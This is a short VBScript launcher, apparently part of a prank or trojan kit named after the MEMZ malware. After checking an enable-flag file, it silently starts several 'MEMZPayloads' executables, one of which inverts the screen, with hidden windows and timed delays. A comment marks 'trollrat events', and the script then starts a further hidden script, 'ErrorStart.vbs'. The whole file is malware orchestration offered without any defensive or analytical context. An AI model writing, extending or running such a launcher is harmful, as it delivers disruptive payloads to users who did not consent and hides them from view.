Function ReadFileToString(readfilepath)
    Set fs2 = CreateObject("Scripting.FileSystemObject") 
    Set file = fs2.OpenTextFile(readfilepath, 1, false) 
    ReadFileToString = file.readall 
    file.close 
    set fs2 = nothing 
end Function

set WSHShell = CreateObject("WScript.Shell") 'dotnet reference
WSHShell.currentdirectory = createobject("Scripting.FileSystemObject").GetFile(Wscript.ScriptFullName).ParentFolder.Path
dim Enabled
Enabled = ReadFileToString("EnableMEMZPayloads.boolean")
if Enabled = "false" then
WScript.Quit
end if
' WScript.Sleep 550 but we already slept
WSHShell.Run "MEMZPayloads-InvertScreen.exe", 0
WScript.Sleep 1200
WSHShell.Run "MEMZPayloads-3.exe", 0
WScript.Sleep 850
WSHShell.Run "MEMZPayloads-6.exe", 0
WScript.Sleep 650
WSHShell.Run "MEMZPayloads-1.exe", 0
'trollrat events down here
WScript.Sleep 850
WSHShell.Run "wscript ..\Wahoo\ErrorStart.vbs", 0